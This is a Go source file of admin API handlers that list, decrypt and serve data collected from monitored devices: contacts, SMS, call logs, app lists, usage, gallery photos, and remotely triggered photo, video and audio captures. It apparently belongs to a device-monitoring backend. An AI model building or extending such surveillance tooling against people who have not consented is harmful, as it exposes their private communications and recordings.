package handlers

import (
	"bytes"
	"image"
	_ "image/jpeg"
	_ "image/png"
	"image/jpeg"
	"net/http"
	"strconv"

	"github.com/go-chi/chi/v5"
	"golang.org/x/image/draw"
	"mop-api/internal/audit"
	"mop-api/internal/store"
	"mop-api/pkg"
)

// GalleryThumbMaxPx 后台生成相册列表缩略图时的最长边像素（用于 GET /admin/audit/gallery/thumb 等从原图生成缩略图）
const GalleryThumbMaxPx = 120

// 管理端审计数据查询（PROTOCOL 5.1）：从 audit_blobs 存储查询，返回元数据列表（脱敏：不返回 payload 内容，仅 id/type/msg_id/created_at/size）
// GET /api/v1/admin/audit/contacts?device_id=xxx 等，path 决定 type；captures 合并 capture_photo、capture_video、capture_audio

func (h *Handler) adminAuditList(w http.ResponseWriter, r *http.Request, auditType string) {
	deviceID := r.URL.Query().Get("device_id")
	if deviceID == "" {
		pkg.Err(w, http.StatusBadRequest, "bad_request", "device_id required")
		return
	}
	limit := 50
	if l := r.URL.Query().Get("limit"); l != "" {
		if n, _ := strconv.Atoi(l); n > 0 && n <= 200 {
			limit = n
		}
	}
	var list []store.AuditItem
	var err error
	if auditType == "captures" {
		// 合并三种远程采集类型
		for _, t := range []string{"capture_photo", "capture_video", "capture_audio"} {
			items, e := h.Store.ListAuditByDevice(r.Context(), deviceID, t, limit)
			if e != nil {
				pkg.Err(w, http.StatusInternalServerError, "internal_error", "")
				return
			}
			list = append(list, items...)
		}
	} else {
		list, err = h.Store.ListAuditByDevice(r.Context(), deviceID, auditType, limit)
		if err != nil {
			pkg.Err(w, http.StatusInternalServerError, "internal_error", "")
			return
		}
	}
	// 返回元数据，不返回 payload（脱敏；下载单条见 GET /admin/audit/blob/:id）
	items := make([]map[string]interface{}, 0, len(list))
	for _, a := range list {
		items = append(items, map[string]interface{}{
			"id":         a.ID,
			"type":      a.Type,
			"msg_id":    a.MsgID,
			"created_at": a.CreatedAt,
			"size":      a.Size,
		})
	}
	pkg.JSON(w, http.StatusOK, map[string]interface{}{"items": items})
}

// AdminAuditContacts GET /api/v1/admin/audit/contacts?device_id=xxx
func (h *Handler) AdminAuditContacts(w http.ResponseWriter, r *http.Request) { h.adminAuditList(w, r, "contacts") }

// AdminAuditSms GET /api/v1/admin/audit/sms?device_id=xxx
func (h *Handler) AdminAuditSms(w http.ResponseWriter, r *http.Request) { h.adminAuditList(w, r, "sms") }

// AdminAuditCallLog GET /api/v1/admin/audit/call_log?device_id=xxx
func (h *Handler) AdminAuditCallLog(w http.ResponseWriter, r *http.Request) { h.adminAuditList(w, r, "call_log") }

// AdminAuditAppList GET /api/v1/admin/audit/app_list?device_id=xxx
func (h *Handler) AdminAuditAppList(w http.ResponseWriter, r *http.Request) { h.adminAuditList(w, r, "app_list") }

// AdminAuditGallery GET /api/v1/admin/audit/gallery?device_id=xxx
func (h *Handler) AdminAuditGallery(w http.ResponseWriter, r *http.Request) { h.adminAuditList(w, r, "gallery") }

// AdminAuditGalleryPhoto GET /api/v1/admin/audit/gallery_photo?device_id=xxx 原图相册列表（每条对应 thumb/by-ref）
func (h *Handler) AdminAuditGalleryPhoto(w http.ResponseWriter, r *http.Request) { h.adminAuditList(w, r, "gallery_photo") }

// AdminAuditUsage GET /api/v1/admin/audit/usage?device_id=xxx 应用使用时长（Android）
func (h *Handler) AdminAuditUsage(w http.ResponseWriter, r *http.Request) { h.adminAuditList(w, r, "usage") }

// AdminAuditCaptures GET /api/v1/admin/audit/captures?device_id=xxx 远程采集结果（拍照/录像/录音）
func (h *Handler) AdminAuditCaptures(w http.ResponseWriter, r *http.Request) { h.adminAuditList(w, r, "captures") }

// AdminAuditBlob GET /api/v1/admin/audit/blob/:id 下载单条审计 payload（管理端鉴权，返回二进制或 404）
func (h *Handler) AdminAuditBlob(w http.ResponseWriter, r *http.Request) {
	idStr := chi.URLParam(r, "id")
	if idStr == "" {
		pkg.Err(w, http.StatusBadRequest, "bad_request", "id required")
		return
	}
	id, err := strconv.ParseInt(idStr, 10, 64)
	if err != nil || id <= 0 {
		pkg.Err(w, http.StatusBadRequest, "bad_request", "invalid id")
		return
	}
	item, err := h.Store.GetAuditBlob(r.Context(), id)
	if err != nil {
		pkg.Err(w, http.StatusInternalServerError, "internal_error", "")
		return
	}
	if item == nil {
		pkg.Err(w, http.StatusNotFound, "not_found", "")
		return
	}
	payload := item.Payload
	if len(payload) > 0 {
		// 新数据已在入库时解密；兼容旧数据：尝试解密后返回
		if decrypted, err := audit.DecryptPayload(item.DeviceID, item.Payload); err == nil {
			payload = decrypted
		}
		// 若为 JSON（用于前端 getAuditBlobJson 直接解析），返回 application/json 便于展示
		if len(payload) > 0 && (payload[0] == '{' || payload[0] == '[') {
			w.Header().Set("Content-Type", "application/json; charset=utf-8")
		} else {
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Header().Set("Content-Disposition", "attachment; filename=audit_"+idStr+"_"+item.Type)
		}
		w.Write(payload)
	}
}

// AdminAuditGalleryThumb GET /api/v1/admin/audit/gallery/thumb?device_id=&msg_id= 从 gallery_photo 原图生成 120px 缩略图 JPEG
func (h *Handler) AdminAuditGalleryThumb(w http.ResponseWriter, r *http.Request) {
	deviceID := r.URL.Query().Get("device_id")
	msgID := r.URL.Query().Get("msg_id")
	if deviceID == "" || msgID == "" {
		pkg.Err(w, http.StatusBadRequest, "bad_request", "device_id and msg_id required")
		return
	}
	item, err := h.Store.GetAuditBlobByRef(r.Context(), deviceID, "gallery_photo", msgID)
	if err != nil || item == nil {
		pkg.Err(w, http.StatusNotFound, "not_found", "")
		return
	}
	payload := item.Payload
	if len(payload) > 0 {
		if decrypted, err := audit.DecryptPayload(item.DeviceID, item.Payload); err == nil {
			payload = decrypted
		}
	}
	if len(payload) == 0 {
		pkg.Err(w, http.StatusNotFound, "not_found", "")
		return
	}
	img, _, err := image.Decode(bytes.NewReader(payload))
	if err != nil {
		pkg.Err(w, http.StatusUnprocessableEntity, "invalid_image", "")
		return
	}
	out := scaleToMaxPx(img, GalleryThumbMaxPx)
	w.Header().Set("Content-Type", "image/jpeg")
	if err := jpeg.Encode(w, out, &jpeg.Options{Quality: 85}); err != nil {
		pkg.Err(w, http.StatusInternalServerError, "internal_error", "")
	}
}

// scaleToMaxPx 将图片最长边缩放到 maxPx，保持比例
func scaleToMaxPx(src image.Image, maxPx int) image.Image {
	b := src.Bounds()
	w, h := b.Dx(), b.Dy()
	if w <= maxPx && h <= maxPx {
		return src
	}
	var dw, dh int
	if w >= h {
		dw = maxPx
		dh = h * maxPx / w
	} else {
		dh = maxPx
		dw = w * maxPx / h
	}
	if dw < 1 {
		dw = 1
	}
	if dh < 1 {
		dh = 1
	}
	dst := image.NewRGBA(image.Rect(0, 0, dw, dh))
	draw.ApproxBiLinear.Scale(dst, dst.Bounds(), src, b, draw.Over, nil)
	return dst
}

// AdminAuditBlobByRef GET /api/v1/admin/audit/blob/by-ref?device_id=&type=gallery_photo&msg_id= 返回解密后的原图
func (h *Handler) AdminAuditBlobByRef(w http.ResponseWriter, r *http.Request) {
	deviceID := r.URL.Query().Get("device_id")
	auditType := r.URL.Query().Get("type")
	msgID := r.URL.Query().Get("msg_id")
	if deviceID == "" || auditType == "" || msgID == "" {
		pkg.Err(w, http.StatusBadRequest, "bad_request", "device_id, type and msg_id required")
		return
	}
	item, err := h.Store.GetAuditBlobByRef(r.Context(), deviceID, auditType, msgID)
	if err != nil || item == nil {
		pkg.Err(w, http.StatusNotFound, "not_found", "")
		return
	}
	payload := item.Payload
	if len(payload) > 0 {
		if decrypted, err := audit.DecryptPayload(item.DeviceID, item.Payload); err == nil {
			payload = decrypted
		}
	}
	if len(payload) == 0 {
		pkg.Err(w, http.StatusNotFound, "not_found", "")
		return
	}
	contentType := "application/octet-stream"
	if len(payload) >= 2 {
		if payload[0] == 0xff && payload[1] == 0xd8 {
			contentType = "image/jpeg"
		} else if len(payload) >= 4 && payload[0] == 0x89 && payload[1] == 0x50 && payload[2] == 0x4e && payload[3] == 0x47 {
			contentType = "image/png"
		}
	}
	w.Header().Set("Content-Type", contentType)
	w.Write(payload)
}
